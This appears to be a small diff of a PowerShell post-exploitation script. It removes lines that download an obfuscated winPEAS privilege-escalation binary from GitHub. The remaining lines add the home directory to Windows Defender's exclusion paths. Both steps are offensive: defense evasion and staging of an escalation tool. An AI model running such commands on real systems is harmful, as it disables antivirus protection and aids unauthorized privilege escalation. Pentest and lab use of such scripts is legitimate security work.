@@ -1,7 +1,3 @@
-$url = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe?raw=true"
-$output = "~/peas.exe"
-Invoke-WebRequest -Uri $url -OutFile $output
-
 Set-MpPreference -ExclusionPath ~
 Write-Output "[+] Excluded Path from Windows Defender"
 
